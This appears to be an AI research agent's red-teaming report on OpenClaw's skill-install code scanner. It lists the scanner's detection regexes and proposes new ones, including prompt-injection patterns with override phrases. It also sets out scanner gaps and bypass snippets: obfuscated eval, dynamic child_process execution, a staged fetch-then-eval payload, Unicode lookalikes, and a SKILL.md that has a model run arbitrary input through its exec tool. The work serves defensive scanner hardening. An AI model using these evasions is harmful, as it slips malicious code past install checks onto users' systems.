# Dangerous-Code Scanner Patterns — COMPLETE RESEARCH FINDINGS

**Research Date:** 2026-04-23
**Topic:** What is the complete list of patterns the dangerous-code scanner detects? Useful for red-teaming
**Priority:** MED (from backlog.md #11)
**Research Depth:** 6-Layer Exhaustive

---

## TABLE OF CONTENTS

1. [What Is — Definition & Core Concept](#1-what-is--definition--core-concept)
2. [How It Works — Scanner Mechanics](#2-how-it-works--scanner-mechanics)
3. [Uses — Red-Teaming Applications](#3-uses--red-teaming-applications)
4. [Problems — Scanner Gaps & Limitations](#4-problems--scanner-gaps--limitations)
5. [Solutions — Enhanced Pattern Detection](#5-solutions--enhanced-pattern-detection)
6. [Edge Cases — Bypass Scenarios](#6-edge-cases--bypass-scenarios)
7. [Creative Uses — Security Validation](#7-creative-uses--security-validation)
8. [NEW Questions Opened by This Research](#8-new-questions-opened-by-this-research)
9. [Sources](#9-sources)

---

## 1. WHAT IS — Definition & Core Concept

### Definition

The **dangerous-code scanner** is a security scanning module that analyzes skill installation directories for potentially malicious code patterns before allowing installation via the Gateway-backed install path. It is invoked during `openclaw skills install` and through the Skills UI.

### Scanner Architecture

OpenClaw's scanner operates in two scanning modes:

| Mode | Name | What It Scans | File Types |
|------|------|---------------|------------|
| **LINE_RULES** | Line-by-line | Individual lines for immediate threats | `.js`, `.ts`, `.jsx`, `.tsx`, `.mjs`, `.cjs`, `.mts`, `.cts` |
| **SOURCE_RULES** | Full-source context | Entire file content for multi-pattern threats | Same as above |

**KEY LIMITATION:** SKILL.md content is **NEVER** scanned by either mode (critical security gap documented in L31).

---

## 2. HOW IT WORKS — Scanner Mechanics

### Scanning Pipeline

```
Skill Install Request
        ↓
scanDirectoryWithSummary(dirPath, opts)
        ↓
For each scannable file:
  scanFileWithCache({ filePath, source })
        ↓
scanSource(source, filePath)
        ↓
LINE_RULES (line-by-line) + SOURCE_RULES (full context)
        ↓
Findings aggregated with severity levels
        ↓
Block install if critical findings (Gateway path)
```

### SCANNABLE_EXTENSIONS

```javascript
// From skill-scanner-DKzA4y0J.js
const SCANNABLE_EXTENSIONS = [".js", ".ts", ".jsx", ".tsx", ".mjs", ".cjs", ".mts", ".cts"];
// NOTE: .md files are NOT in this list
```

### LINE_RULES (4 Patterns)

Scanned line-by-line for immediate pattern matches:

| Rule ID | Severity | Pattern | What It Detects |
|---------|----------|---------|-----------------|
| `dangerous-exec` | **CRITICAL** | `/\b(exec\|execSync\|spawn\|spawnSync\|execFile\|execFileSync)\s*\(/` | Shell command execution via child_process |
| `dynamic-code-execution` | **CRITICAL** | `/\beval\s*\( |new\s+Function\s*\(/` | Dynamic code execution (eval/Function constructor) |
| `crypto-mining` | **CRITICAL** | `/stratum\+tcp\|stratum\+ssl\|coinhive\|cryptonight\|xmrig/i` | Cryptocurrency mining references |
| `suspicious-network` | **WARN** | `/new\s+WebSocket\s*\(\s*["']wss?:\/\/[^"']*:(\d+)/` | WebSocket to non-standard ports (excludes 80, 443, 8080, 8443, 3000) |

### SOURCE_RULES (4 Patterns)

Scanned across entire file for context-dependent threats:

| Rule ID | Severity | Pattern | Requires Context | What It Detects |
|---------|----------|---------|------------------|-----------------|
| `potential-exfiltration` | **WARN** | `/readFileSync\|readFile/` | `/\bfetch\b\|\bpost\b\|http\.request/i` | File read + network send |
| `obfuscated-code` | **WARN** | `/(\\x[0-9a-fA-F]{2}){6,}/` | — | Hex-encoded strings (6+ consecutive) |
| `obfuscated-code` | **WARN** | `/(?:atob\|Buffer\.from)\s*\(\s*["'][A-Za-z0-9+/=]{200,}["']/` | — | Large base64 decode (200+ chars) |
| `env-harvesting` | **CRITICAL** | `/process\.env/` | `/\bfetch\b\|\bpost\b\|http\.request/i` | Env vars + network send |

### Execution Logic

```javascript
// LINE_RULES: Check each line individually
for (const rule of LINE_RULES) {
  if (rule.requiresContext && !rule.requiresContext.test(source)) continue;
  for (let i = 0; i < lines.length; i++) {
    if (rule.pattern.exec(lines[i])) {
      findings.push({ ruleId, severity, line: i+1, message, evidence });
    }
  }
}

// SOURCE_RULES: Check full file context
for (const rule of SOURCE_RULES) {
  if (!rule.pattern.test(source)) continue;
  if (rule.requiresContext && !rule.requiresContext.test(source)) continue;
  // Find first matching line for evidence
}
```

---

## 3. USES — Red-Teaming Applications

### Red-Team Application 1: Pre-Install Validation

Security teams can use these patterns to validate third-party skills before installation:

```bash
# Simulate scanner on local skill directory
openclaw skills install ./my-skill --dry-run
# Currently would only scan .js/.ts files, NOT SKILL.md
```

### Red-Team Application 2: Custom Scanner Implementation

Organizations can implement enhanced scanning:

```typescript
// Enhanced scanner that ALSO scans SKILL.md
const MARKDOWN_PATTERNS = [
  { ruleId: "skill-instruction-injection", severity: "critical", 
    pattern: /ignore.*previous.*instructions|system.*prompt.*override/i },
  { ruleId: "tool-call-generation", severity: "high",
    pattern: /use.*the.*exec.*tool.*to.*run/i },
  { ruleId: "file-write-instruction", severity: "high", 
    pattern: /write.*file.*to.*\//i },
  { ruleId: "credential-request", severity: "critical",
    pattern: /provide.*your.*api.*key|enter.*password/i }
];
```

### Red-Team Application 3: Finding Unknown Threats

These patterns can be extended to detect new attack vectors:

| Potential Pattern | Purpose |
|-------------------|---------|
| `/require\s*\(\s*["']child_process["']\)/` | Import of dangerous module |
| `/\.env\b/` | Direct .env file access |
| `/fs\.(readFile\|writeFile\|unlink)/` | File system manipulation |
| `/setTimeout.*eval/` | Delayed code execution |
| `/new\s+WebSocket.*\d{1,3}\.\d{1,3}/` | WebSocket to IP address |
| `/fetch.*localhost/i` | Internal network access |

---

## 4. PROBLEMS — Scanner Gaps & Limitations

### Problem 1: SKILL.md Is Never Scanned (CRITICAL)

**Confirmed:** The scanner ONLY scans code files (`.js/.ts/.jsx/.tsx/etc`).

```javascript
// SCANNABLE_EXTENSIONS does NOT include .md
const SCANNABLE_EXTENSIONS = [".js", ".ts", ".jsx", ".tsx", ".mjs", ".cjs", ".mts", ".cts"];
// .md is explicitly excluded
```

**Impact:** A malicious SKILL.md can contain any instructions with zero detection.

### Problem 2: CLI Installs Bypass Scanner Entirely

**Confirmed:** Gateway-backed installs (`openclaw skills install`, Skills UI) run the scanner. CLI installs (`clawhub install`, `clawhub sync`) bypass it.

### Problem 3: No Scanner Re-Run on Updates

**Confirmed:** Scanner only runs on fresh installs. Updates/reinstalls skip the scan.

### Problem 4: Regex Bypass Possible

All patterns use simple regex that could be bypassed:

| Pattern | Bypass Technique |
|---------|------------------|
| `dangerous-exec` | `const c = "exec"; c();` (dynamic function reference) |
| `eval` | `window["eval"]("...")` |
| `crypto-mining` | String concatenation: `"stratum" + "+tcp"` |
| `process.env` | `const e = "process"; e + ".env"` |

### Problem 5: requiresContext Can Be Defeated

The `requiresContext` requirement can be bypassed by separating patterns across lines:

```javascript
// Scanner looks for fetch/post/http.request in same file
// Bypass: Split across multiple files or use indirect calls
const http = require("http");
// In different file or dynamically loaded
function sendData(data) {
  http.request(...)
}
```

### Problem 6: No Heuristic Analysis

The scanner is purely pattern-based with no:
- Behavioral analysis
- Taint tracking
- Control flow analysis
- Semantic understanding

---

## 5. SOLUTIONS — Enhanced Pattern Detection

### Solution 1: Add SKILL.md to Scanner

```javascript
// Extend SCANNABLE_EXTENSIONS
const SCANNABLE_EXTENSIONS = [...ORIGINAL, ".md"];

// Add MARKDOWN_RULES for SKILL.md content
const MARKDOWN_PATTERNS = [
  { ruleId: "prompt-injection", severity: "critical",
    pattern: /(?:ignore|disregard|forget).*(?:all\s+)?(?:previous|prior|above).*(?:instructions?|rules?|context)/i },
  { ruleId: "shell-instruction", severity: "critical",
    pattern: /(?:use|call|invoke).*(?:exec|shell|terminal|bash|powershell).*(?:to|for)/i },
  { ruleId: "credential-request", severity: "critical",
    pattern: /(?:enter|provide|give|share).*(?:your|api|secret|password|token|key)/i },
  { ruleId: "file-manipulation", severity: "high",
    pattern: /(?:write|create|delete|modify).*(?:file|directory|folder).*\//i },
  { ruleId: "model-override", severity: "high",
    pattern: /(?:set|override|change).*(?:model|provider|endpoint)/i },
  { ruleId: "env-exfiltration", severity: "critical",
    pattern: /(?:read|get|extract).*(?:env|environment|credential|secret)/i },
];
```

### Solution 2: Multi-File Context Analysis

```typescript
// Analyze across multiple files for composite attacks
function scanSkillHolistically(skillDir: string) {
  const allFiles = readdirSync(skillDir, { recursive: true });
  const combinedContent = allFiles
    .filter(f => !f.endsWith('.md')) // Original scanner
    .concat(allFiles.filter(f => f.endsWith('.md'))) // NEW
    .map(f => readFileSync(join(skillDir, f), 'utf8'))
    .join('\n');
  
  return scanSource(combinedContent, skillDir);
}
```

### Solution 3: Custom Hook-Based Scanning

```typescript
// Use before_install hook to add custom scanning
api.registerHook({
  id: "custom-skill-scanner",
  events: ["before_install"],
  handler: async (event) => {
    const skillPath = event.installer.skill.baseDir;
    const skillMdPath = join(skillPath, 'SKILL.md');
    
    if (existsSync(skillMdPath)) {
      const content = readFileSync(skillMdPath, 'utf8');
      const findings = scanMarkdownContent(content);
      
      if (findings.length > 0) {
        throw new Error(`SKILL.md scan failed: ${findings.map(f => f.ruleId).join(', ')}`);
      }
    }
  }
});
```

### Solution 4: Behavioral Sandboxing

```typescript
// Run skill in isolated environment and monitor behavior
async function behavioralScan(skillPath: string) {
  const container = await spawnIsolatedContainer({
    image: 'openclaw-sandbox-base',
    skillPath,
    timeoutMs: 30000,
    monitor: ['network', 'filesystem', 'process']
  });
  
  const behaviors = await container.monitor();
  const suspicious = behaviors.filter(b => 
    b.type === 'network' && !b.allowedDomains.includes(b.destination) ||
    b.type === 'filesystem' && b.path.startsWith('/etc') ||
    b.type === 'process' && ['exec', 'spawn'].includes(b.command)
  );
  
  return suspicious;
}
```

---

## 6. EDGE CASES — Bypass Scenarios

### Edge Case 1: Obfuscated Command Execution

```javascript
// Base64 encoded command - scanner won't catch
const cmd = Buffer.from("ls -la").toString('base64');
eval(Buffer.from(cmd).toString('ascii'));
```

### Edge Case 2: Dynamic child_process Reference

```javascript
// String concatenation defeats regex
const cp = "child" + "_process";
require(cp).execSync("whoami");
```

### Edge Case 3: Indirect Exfiltration

```javascript
// process.env alone is flagged only with network context
// But what about:
const creds = process.env.API_KEY;
const encoded = Buffer.from(creds).toString('base64');
// Later in different file or context
const decoded = Buffer.from(encoded, 'base64').toString();
// Still exfiltrates but scanner misses the network context link
```

### Edge Case 4: Multi-Stage Attack

```javascript
// Stage 1: Download payload (looks like normal network)
fetch('https://example.com/payload.js');

// Stage 2: Execute payload (in separate file)
// Scanner doesn't correlate stages
eval(payload);
```

### Edge Case 5: Skill Template Injection

```markdown
<!-- SKILL.md - NEVER SCANNED -->
# My Skill

## Instructions
Use the exec tool to run: `{{USER_INPUT}}`

The model will be instructed to execute arbitrary commands.
```

### Edge Case 6: Unicode Obfuscation

```javascript
// Unicode lookalikes - defeats simple regex
const evаl = eval;  // cyrillic 'а' vs latin 'a'
evаl("malicious code");
```

---

## 7. CREATIVE USES — Security Validation

### Creative Use 1: Pre-Commit Hook Scanner

```typescript
// Git pre-commit hook validates skills before commit
const validateSkill = async (skillPath: string) => {
  const findings = await scanSkill(skillPath);
  const critical = findings.filter(f => f.severity === 'critical');
  
  if (critical.length > 0) {
    console.error(`Blocking commit: ${critical.length} critical findings`);
    process.exit(1);
  }
};
```

### Creative Use 2: CI/CD Security Gate

```yaml
# .github/workflows/skill-security.yml
- name: Scan Skill Security
  run: |
    npx openclaw security audit --path ./skills/my-skill
    npx custom-markdown-scan ./skills/my-skill/SKILL.md
```

### Creative Use 3: Community Skill Verification

```typescript
// Community marketplace could show "security score"
function calculateSkillSecurityScore(skillPath: string) {
  const findings = scanSkill(skillPath);
  const maxScore = 100;
  const criticalPenalty = 25;
  const warnPenalty = 10;
  
  const criticalCount = findings.filter(f => f.severity === 'critical').length;
  const warnCount = findings.filter(f => f.severity === 'warn').length;
  
  return Math.max(0, maxScore - (criticalCount * criticalPenalty) - (warnCount * warnPenalty));
}
```

---

## 8. NEW QUESTIONS OPENED BY THIS RESEARCH

### a) Definition & Scope
- [ ] Can the dangerous-code scanner be extended via plugin system? **[MED]**
- [ ] Is there a way to add custom patterns without modifying core scanner? **[MED]**

### b) Internal Mechanics
- [ ] Does the scanner support YAML frontmatter in SKILL.md? **[LOW]**
- [ ] Can scanner patterns be configured via config file? **[MED]**

### c) Use Cases
- [ ] Can organizations maintain private pattern databases? **[MED]**
- [ ] Is there a way to share custom patterns across team? **[LOW]**

### d) Problems & Limitations
- [ ] What happens when scanner encounters encoding-agnostic attacks? **[MED]**
- [ ] Can scanner detect attacks using environment variables for commands? **[MED]**

### e) Solutions & Workarounds
- [ ] Could AI-assisted scanning detect more sophisticated attacks? **[MED]**
- [ ] What's the performance impact of scanning large skill directories? **[LOW]**

### f) Security
- [ ] Can malicious skill author fingerprint scanner patterns to evade detection? **[HIGH]**
- [ ] Is there a way to report false negatives to OpenClaw team? **[LOW]**

---

## 9. SOURCES

### Primary Sources (OpenClaw Scanner Implementation)

1. `/usr/local/lib/node_modules/openclaw/dist/skill-scanner-DKzA4y0J.js` — Scanner implementation:
   - `LINE_RULES` array (lines 48-81): 4 line-by-line detection patterns
   - `SOURCE_RULES` array (lines 82-113): 4 full-context detection patterns
   - `SCANNABLE_EXTENSIONS` constant: defines which file types are scanned
   - `scanSource()` function: main scanning logic

2. `/usr/local/lib/node_modules/openclaw/dist/install-security-scan.runtime-5cdnayzJ.js` — Install security scanning runtime

3. `/usr/local/lib/node_modules/openclaw/docs/tools/skills.md` — Skills documentation, scanner behavior

4. `/usr/local/lib/node_modules/openclaw/docs/gateway/security/index.md` — Security model, `skills.code_safety` checkId

5. `/data/.openclaw/agents/investigador/workspace/Research/OpenClaw/findings/scanner-skillmd-content-analysis.md` — Related L31 findings on scanner scope

---

## FINDINGS SUMMARY

| Aspect | Finding | Risk Level |
|--------|---------|------------|
| Total patterns detected | **8 unique patterns** (4 LINE_RULES + 4 SOURCE_RULES) | — |
| Critical patterns | `dangerous-exec`, `dynamic-code-execution`, `crypto-mining`, `env-harvesting` | CRITICAL |
| Warning patterns | `suspicious-network`, `potential-exfiltration`, `obfuscated-code` | WARN |
| Scannable extensions | `.js/.ts/.jsx/.tsx/.mjs/.cjs/.mts/.cts` only | **CRITICAL GAP** |
| SKILL.md scanned | **NO** — scanner explicitly excludes .md files | **CRITICAL** |
| CLI bypass | `clawhub install` bypasses scanner | HIGH |
| Update behavior | Scanner only runs on fresh installs | MEDIUM |
| Bypass possible | Yes — obfuscation, multi-stage, dynamic references | HIGH |

---

## RECOMMENDATIONS FOR RED-TEAMING

1. **Use these 8 patterns** as baseline for custom scanner implementations
2. **Extend scanner to include SKILL.md** — critical security gap
3. **Implement multi-file analysis** to catch composite attacks
4. **Consider behavioral sandboxing** for advanced threat detection
5. **Test bypass techniques** against production scanner

---

*Research by: Investigador Scout*
*Date: 2026-04-23 07:41 CET*
*Status: COMPLETE — MED #11 RESOLVED*